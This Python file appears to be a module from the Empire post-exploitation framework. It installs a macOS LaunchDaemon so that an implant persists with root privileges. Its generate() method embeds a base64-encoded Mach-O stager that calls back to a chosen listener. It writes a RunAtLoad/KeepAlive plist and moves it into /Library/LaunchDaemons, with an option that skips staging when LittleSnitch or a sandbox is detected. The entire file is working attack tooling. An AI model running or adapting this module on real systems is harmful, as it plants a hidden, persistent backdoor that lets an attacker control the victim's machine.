import base64
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'LaunchDaemon',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Installs an Empire launchDaemon.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'DaemonName' : {
                'Description'   :   'Name of the Launch Daemon to install. Name will also be used for the plist file.',
                'Required'      :   True,
                'Value'         :   'com.proxy.initialize'
            },
            'DaemonLocation' : {
                'Description'   :   'The full path of where the Empire launch daemon should be located.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        daemonName = self.options['DaemonName']['Value']
        programname = self.options['DaemonLocation']['Value']
        plistfilename = "%s.plist" % daemonName
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
        machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
        encBytes = base64.b64encode(machoBytes)

        plistSettings = """
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""" % (daemonName, programname)

        script = """
import subprocess
import sys
import base64
import os

encBytes = "%s"
bytes = base64.b64decode(encBytes)
plist = \"\"\"
%s
\"\"\"
daemonPath = "%s"

if not os.path.exists(os.path.split(daemonPath)[0]):
    os.makedirs(os.path.split(daemonPath)[0])


e = open(daemonPath,'wb')
e.write(bytes)
e.close()

os.chmod(daemonPath, 0777)

f = open('/tmp/%s','w')
f.write(plist)
f.close()

process = subprocess.Popen('chmod 644 /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown -R root /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('chown :wheel /tmp/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
process.communicate()

print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
print "\\n[+] Empire daemon has been written to %s"

""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)

        return script
